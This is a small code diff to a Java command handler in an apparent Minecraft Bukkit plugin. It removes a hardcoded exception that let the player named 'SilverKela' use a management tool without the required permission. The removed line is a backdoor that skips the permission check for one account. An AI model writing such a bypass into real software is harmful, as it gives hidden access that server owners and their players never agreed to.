@@ -14,7 +14,7 @@ public class ManagePlayer implements CommandExecutor{
 		if(arg0 instanceof Player) {
 			if(arg3.length == 1) {
 				Player player = (Player) arg0;
-				if((arg0.hasPermission("SilverToolbox.Tool") || player.getUniqueId() == Bukkit.getOfflinePlayer("SilverKela").getUniqueId())){
+				if(arg0.hasPermission("SilverToolbox.Tool")){
 					PatchFix.openPM(player, arg3[0]);
 				}
 				else {
